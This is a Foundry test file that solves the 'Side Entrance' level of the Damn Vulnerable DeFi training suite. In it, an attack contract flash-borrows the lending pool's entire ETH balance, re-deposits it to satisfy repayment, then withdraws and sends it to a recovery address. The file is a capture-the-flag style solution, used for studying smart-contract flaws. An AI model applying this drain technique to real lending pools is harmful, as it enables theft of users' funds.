// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";


contract AttackSideEntrance {
    SideEntranceLenderPool pool;
    address owner;

    constructor(address _pool, address _owner) {
        pool = SideEntranceLenderPool(_pool);
        owner = _owner;
    }

    function attack() external {
        uint256 _amount = address(pool).balance;
        pool.flashLoan(_amount);
        pool.withdraw();
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        console.log("### test_sideEntrance start ###");

        console.log("");
        console.log("#1 Before attack");
        console.log("pool balance:", address(pool).balance/1e18);
        console.log("player balance:", address(player).balance/1e18);
        console.log("recovery balance:", address(recovery).balance/1e18);

        console.log("");
        console.log("#2 Run attack");
        run_attack();

        console.log("");
        console.log("#3 After attack");
        console.log("pool balance:", address(pool).balance/1e18);
        console.log("player balance:", address(player).balance/1e18);
        console.log("recovery balance:", address(recovery).balance/1e18);

        console.log("");
        console.log("### test_sideEntrance end ###");
    }

    function run_attack() internal {
        AttackSideEntrance attackContract = new AttackSideEntrance(address(pool), recovery);
        attackContract.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}
